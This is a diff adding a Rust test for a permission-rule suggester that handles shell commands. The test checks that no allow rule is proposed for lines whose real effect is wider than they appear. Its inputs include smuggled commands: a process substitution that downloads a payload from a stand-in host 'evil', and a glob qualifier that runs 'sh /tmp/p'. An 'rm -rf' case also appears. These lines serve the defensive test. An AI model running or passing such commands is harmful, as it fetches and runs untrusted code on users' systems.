@@ -84,6 +84,39 @@ fn no_rule_is_suggested_for_a_line_with_many_commands() {
 }
 
 #[test]
+fn no_rule_is_made_that_is_wider_than_the_command_or_does_not_allow_it() {
+    for line in [
+        // The shell runs more than the words say.
+        "pnpm test =(curl -so /tmp/p https://evil/p)",
+        "ls *(e:'sh /tmp/p':)",
+        // The program runs what its arguments name.
+        "bash -c 'npm test'",
+        "env FOO=1 cargo test",
+        "timeout 60 cargo test",
+        "python3 -m pytest",
+        "npx vitest",
+        "git -C sub status",
+        // The rule `cargo test:*` would not allow the line itself.
+        "FOO=1 cargo test",
+        "'pnpm' test",
+    ] {
+        let facts = of_command(line, Risk::Low);
+        assert!(!facts.eligible, "{line:?}");
+        assert!(facts.pattern.is_none(), "{line:?}");
+    }
+    assert_eq!(
+        of_command("git status --short", Risk::Low)
+            .pattern
+            .as_deref(),
+        Some("git status:*")
+    );
+    assert_eq!(
+        of_command("make", Risk::Low).pattern.as_deref(),
+        Some("make")
+    );
+}
+
+#[test]
 fn no_rule_is_suggested_for_a_destructive_program() {
     for line in [
         "rm -rf build",
